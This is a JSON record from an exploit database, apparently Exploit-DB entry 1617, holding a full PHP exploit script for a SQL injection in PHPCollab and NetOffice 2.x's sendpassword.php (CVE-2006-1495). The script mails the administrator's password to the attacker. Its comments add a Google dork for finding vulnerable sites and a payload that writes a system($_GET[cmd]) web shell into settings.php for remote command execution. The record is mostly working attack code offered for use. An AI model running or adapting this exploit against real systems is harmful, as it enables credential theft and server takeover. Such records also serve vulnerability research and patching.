{
  "id": "1617",
  "title": "PHPCollab 2.x / NetOffice 2.x - &#039;sendpassword.php&#039; SQL Injection",
  "cve": "CVE-2006-1495",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/php -q -d short_open_tag=on\r\n<?\r\necho \"PHPCollab v2.x / NetOffice v2.x sendpassword.php SQL Injection \\r\\n\";\r\necho \"by rgod rgod@autistici.org\\r\\n\";\r\necho \"site: http://retrogod.altervista.org\\r\\n\\r\\n\";\r\necho \"-> works with magic_quotes_gpc = Off\\r\\n\\r\\n\";\r\necho \"a googledork: intitle:phpcollab|netoffice \\\"index of\\\" -www-apps -php-collab.org -ext:xml\\r\\n\\r\\n\";\r\nif ($argc<4) {\r\necho \"Usage: php \".$argv[0].\" host path email OPTIONS\\r\\n\";\r\necho \"host:      target server (ip/hostname)\\r\\n\";\r\necho \"path:      path to NetOffice or PHPCollab\\r\\n\";\r\necho \"email:     your email\\r\\n\";\r\necho \"Options:\\r\\n\";\r\necho \"   -p[port]:    specify a port other than 80\\r\\n\";\r\necho \"   -P[ip:port]: specify a proxy\\r\\n\";\r\necho \"Examples:\\r\\n\";\r\necho \"php \".$argv[0].\" localhost /NetOffice/ youremail@somehost.com\\n\";\r\necho \"php \".$argv[0].\" localhost /PhpCollab/ youremail@somehost.com -p81\\r\\n\";\r\necho \"php \".$argv[0].\" localhost / youremail@somehost.com -P1.1.1.1:80\\r\\n\";\r\ndie;\r\n}\r\n\r\n/* explaination:\r\n\r\n   tested & working against: PhpCollab v2.4\r\n\t\t\t     PhpCollab v2.5 rc3\r\n\t                     NetOffice v2.5.3-pl1\r\n\t                     NetOffice v2.6.0b2\r\n   vulnerability;\r\n\r\n   SQL injection in \"forgotten password\" feature:\r\n   if magic_quotes_gpc=Off you can send yourself the admin (md5(), crypt() or\r\n   plain text) password, poc:\r\n   you can submit a \"loginForm\" POST value like this to general/sendpassword.php\r\n   script :\r\n\r\n  'UNION SELECT id,1,CONCAT('this is the real password (encrypted with md5(),\r\n  crypt() or in plain text): ',password),password,name,title,'[your email here]'\r\n  ,null,'','','','',null,1,'2006-03-27 20:48',0,'administration/admin.php','',''\r\n  ,null FROM members mem WHERE id=1/*\r\n\r\n  query becomes:\r\n   SELECT mem.*, org.name, log.connected FROM members mem LEFT OUTER JOIN\r\n   organizations org ON org.id = mem.organization LEFT OUTER JOIN logs log ON\r\n   log.login = mem.login  WHERE mem.login = ''UNION SELECT id,1,CONCAT('this is\r\n   the real password (encrypted with md5(),crypt() or in plain text): ',password\r\n   ),password,name,title,'[your email]',null,'','','','',null,1,'2006-03-27 20:\r\n   48',0,'administration/admin.php','','',null FROM members mem WHERE id=1/*'\r\n\r\n  you will receive soon a mail like this:\r\n\r\n  Username : this is the real password (encrypted with md5(),crypt() or in plain text): [password]\r\n  password : [random generated password]\r\n\r\n  ignore password field, password is not changed, 'cause the UPDATE query fails,\r\n  but the real one is showed in Username mail field.\r\n\r\n  once you are admin, you can inject arbitrary code in settings.php\r\n  (you know, magic_quotes_gpc is off), poc:\r\n  login, go to \"Edit settings\" feature, in FTP SERVER field type:\r\n\r\n  '); system($_GET[cmd]); print ('\r\n\r\n  in settings.php, near line 38, you have:\r\n\r\n  ...\r\n  define('FTPSERVER',''); system($_GET[cmd]); print ('');\r\n  ...\r\n\r\n  so you can launch commands, ex:\r\n\r\n  http://[target]/[path]/general/login.php?cmd=ls%20-la\r\n\t\t\t\t\t\t\t\t\t      */\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\",5);\r\n\r\nfunction quick_dump($string)\r\n{\r\n  $result='';$exa='';$cont=0;\r\n  for ($i=0; $i<=strlen($string)-1; $i++)\r\n  {\r\n   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))\r\n   {$result.=\"  .\";}\r\n   else\r\n   {$result.=\"  \".$string[$i];}\r\n   if (strlen(dechex(ord($string[$i])))==2)\r\n   {$exa.=\" \".dechex(ord($string[$i]));}\r\n   else\r\n   {$exa.=\" 0\".dechex(ord($string[$i]));}\r\n   $cont++;if ($cont==15) {$cont=0; $result.=\"\\r\\n\"; $exa.=\"\\r\\n\";}\r\n  }\r\n return $exa.\"\\r\\n\".$result;\r\n}\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\nfunction sendpacketii($packet)\r\n{\r\n  global $proxy, $host, $port, $html, $proxy_regex;\r\n  if ($proxy=='') {\r\n    $ock=fsockopen(gethostbyname($host),$port);\r\n    if (!$ock) {\r\n      echo 'No response from '.$host.':'.$port; die;\r\n    }\r\n  }\r\n  else {\r\n\t$c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {\r\n      echo 'Not a valid proxy...';die;\r\n    }\r\n    $parts=explode(':',$proxy);\r\n    echo \"Connecting to \".$parts[0].\":\".$parts[1].\" proxy...\\r\\n\";\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      echo 'No response from proxy...';die;\r\n\t}\r\n  }\r\n  fputs($ock,$packet);\r\n  if ($proxy=='') {\r\n    $html='';\r\n    while (!feof($ock)) {\r\n      $html.=fgets($ock);\r\n    }\r\n  }\r\n  else {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\n  fclose($ock);\r\n  #debug\r\n  echo \"\\r\\n\".$html;\r\n}\r\n\r\n$host=$argv[1];\r\n$path=$argv[2];\r\n$your_email=\"\";\r\n$port=80;\r\n$proxy=\"\";\r\nfor ($i=3; $i<=$argc-1; $i++){\r\n$temp=$argv[$i][0].$argv[$i][1];\r\nif (($temp<>\"-p\") and ($temp<>\"-P\"))\r\n{$your_email.=\" \".$argv[$i];}\r\nif ($temp==\"-p\")\r\n{\r\n  $port=str_replace(\"-p\",\"\",$argv[$i]);\r\n}\r\nif ($temp==\"-P\")\r\n{\r\n  $proxy=str_replace(\"-P\",\"\",$argv[$i]);\r\n}\r\n}\r\nif ($proxy<>'') {$p=\"http://\".$host.\":\".$port.$path;} else {$p=$path;}\r\n\r\n$sql =\"'UNION SELECT id,1,CONCAT('this is the real password (encrypted with md5()\";\r\n$sql.=\",crypt() or in plain text): ',password),password,name,title,'\".$your_email;\r\n$sql.=\"',null,'','','','',null,1,'2006-03-27 20:48',0,'administration/admin.php',\";\r\n$sql.=\"'','',null FROM members mem WHERE id=1/*\";\r\n$sql=urlencode($sql);\r\n$data=\"loginForm=\".$sql;\r\n$packet =\"POST \".$p.\"general/sendpassword.php?action=send HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n$packet.=$data;\r\n#debug\r\necho quick_dump($packet);\r\nsendpacketii($packet);\r\necho \"Now check your mailbox...\";\r\n?>\r\n\r\n# milw0rm.com [2006-03-28]",
  "url": "https://www.exploit-db.com/exploits/1617"
}